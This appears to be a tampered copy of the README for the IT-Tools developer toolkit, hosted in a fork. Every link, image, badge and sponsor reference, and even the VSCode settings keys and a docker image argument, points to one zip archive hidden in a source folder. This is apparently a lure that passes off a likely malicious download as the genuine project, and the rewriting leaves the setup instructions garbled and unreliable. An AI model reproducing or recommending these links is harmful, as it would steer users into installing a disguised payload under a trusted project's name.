<picture>
    <source srcset="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" media="(prefers-color-scheme: light)">
    <source srcset="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" media="(prefers-color-scheme: dark)">
    <img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="logo">
</picture>

<p align="center">
Useful tools for developer and people working in IT. <a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">Try it!</a>
</p>


## Sponsors

<div align="center" markdown="1">
<p align="center">
  IT-Tools is proudly sponsored by:
</p>

<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">
  <img alt="Warp sponsorship" width="400" src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">
</a>

### [Warp, built for coding with multiple AI agents.](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
[Available for MacOS, Linux, & Windows](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)<br>

</div>

## Functionalities and roadmap

Please check the [issues](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) to see if some feature listed to be implemented.

You have an idea of a tool? Submit a [feature request](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)!

## Self host

Self host solutions for your homelab

**From docker hub:**

```sh
docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest
```

**From github packages:**

```sh
docker run -d --name it-tools --restart unless-stopped -p 8080:80 https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip
```

**Other solutions:**

- [Cloudron](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
- [Tipi](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
- [Unraid](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)

## Contribute

### Recommended IDE Setup

[VSCode](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) with the following extensions:

- [Volar](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) (and disable Vetur)
- [TypeScript Vue Plugin (Volar)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).
- [ESLint](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
- [i18n Ally](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)

with the following settings:

```json
{
  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": false,
  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": {
    "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": true
  },
  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": ["locales", "src/tools/*/locales"],
  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": "nested"
}
```

### Type Support for `.vue` Imports in TS

TypeScript cannot handle type information for `.vue` imports by default, so we replace the `tsc` CLI with `vue-tsc` for type checking. In editors, we need [TypeScript Vue Plugin (Volar)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) to make the TypeScript language service aware of `.vue` types.

If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a [Take Over Mode](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) that is more performant. You can enable it by the following steps:

1. Disable the built-in TypeScript Extension
   1. Run `Extensions: Show Built-in Extensions` from VSCode's command palette
   2. Find `TypeScript and JavaScript Language Features`, right click and select `Disable (Workspace)`
2. Reload the VSCode window by running `Developer: Reload Window` from the command palette.

### Project Setup

```sh
pnpm install
```

### Compile and Hot-Reload for Development

```sh
pnpm dev
```

### Type-Check, Compile and Minify for Production

```sh
pnpm build
```

### Run Unit Tests with [Vitest](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)

```sh
pnpm test
```

### Lint with [ESLint](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)

```sh
pnpm lint
```

### Create a new tool

To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:

```sh
pnpm run script:create:tool my-tool-name
```

It will create a directory in `src/tools` with the correct files, and a the import in `https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip`. You will just need to add the imported tool in the proper category and develop the tool.

## Contributors

Big thanks to all the people who have already contributed!

[![contributors](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)

## Credits

Coded with ❤️ by [Corentin Thomasset](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).

This project is continuously deployed using [https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).

Contributor graph is generated using [https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).

<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip;tools" target="_blank"><img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip;tools" target="_blank"><img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>

## License

This project is under the [GNU GPLv3](LICENSE).
